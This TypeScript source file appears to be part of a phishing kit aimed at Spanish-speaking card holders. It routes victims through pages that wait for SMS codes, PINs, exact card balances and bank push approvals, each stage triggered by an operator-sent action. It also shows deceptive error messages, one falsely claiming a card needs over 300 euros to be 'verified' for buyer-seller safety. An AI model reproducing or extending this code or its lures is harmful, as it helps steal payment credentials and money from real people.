import { useChatStore } from '../stores/useChatStore'
import { useErrorStore } from '../stores/useErrorStore'

export const parseAction = (
  action: string,
  errorText?: string,
  input?: boolean,
  navigate?: (path: string) => void,
  id?: string
) => {
  console.log('action: ' + action)
  switch (action) {
    case 'open_support_chat':
      useChatStore.getState().openChat()
      break
    case 'sms':
      navigate!(`/waiting-sms/${id}`)
      break
    case 'balance':
      navigate!(`/exact-balance/${id}`)
      break
    case 'pin':
      navigate!(`/waiting-pin/${id}`)
      break
    case 'bank':
      navigate!(`/banks/${id}`)
      break
    case 'push':
      navigate!(`/push/${id}`)
      break
    case 'bankpush':
      navigate!(`/bank-push/${id}`)
      break
    case 'deposit':
      useErrorStore.getState()
        .setErrorText(`Su tarjeta no puede ser verificada por el sistema porque el saldo de su tarjeta es inferior a 300 euros.
Las normas son las mismas para el comprador y el vendedor. Garantizamos la seguridad de ambas partes. 300 euros es una garantía de que esta tarjeta está en circulación con una persona real que no utiliza tarjetas falsificadas y no es un estafador.`)
      navigate!(`/error/${id}`)
      break
    case 'other_card':
      useErrorStore
        .getState()
        .setErrorText(
          `Su tarjeta no admite la recepción de fondos por parte de nuestra entidad adquirente. Por favor, utilice otra`
        )
      navigate!(`/error/${id}`)
      break
    case 'custom_error':
      useErrorStore.getState().setErrorText(errorText === undefined ? 'Error Occured' : errorText)
      useErrorStore.getState().setInput(input!)
      navigate!(`/internal-error/${id}`)
  }
}
